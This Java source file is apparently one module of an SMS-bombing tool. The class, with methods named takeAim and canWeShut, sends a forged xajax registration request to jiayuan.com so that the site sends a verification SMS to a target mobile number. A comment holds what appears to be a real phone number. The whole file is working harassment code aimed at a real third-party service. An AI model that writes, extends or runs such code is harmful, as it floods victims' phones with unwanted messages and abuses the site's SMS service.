package com.l.h.y.cc.HeartBean;

import com.l.h.y.cc.Contances.Contances;
import com.l.h.y.cc.Http.Bundle;

public class SJJY extends HeartBeanAbstrace {

	@Override
	public void takeAim() {

		if(canWeShut()){
			Bundle params = new Bundle();
			
//			xajax:processSendOrUpdateMessage
//			xajaxargs[]:<xjxquery><q>mobile=15201009625</q></xjxquery>
//			xajaxargs[]:mobile
//			xajaxr:1368250016964
			
			params.putString("xajax", "processSendOrUpdateMessage");
			params.putString("xajaxargs[]", "<xjxquery><q>mobile=" + Contances.SHUT_MOBILE_NUM + "</q></xjxquery>");
			params.putString("xajaxargs[]", "mobile");
			params.putString("xajaxr", String.valueOf(System.currentTimeMillis()));
			
//			shutPost("http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage", params);
			shutPost("http://reg.jiayuan.com/libs/xajax/reguser.server.php", params);
		}
	}

}
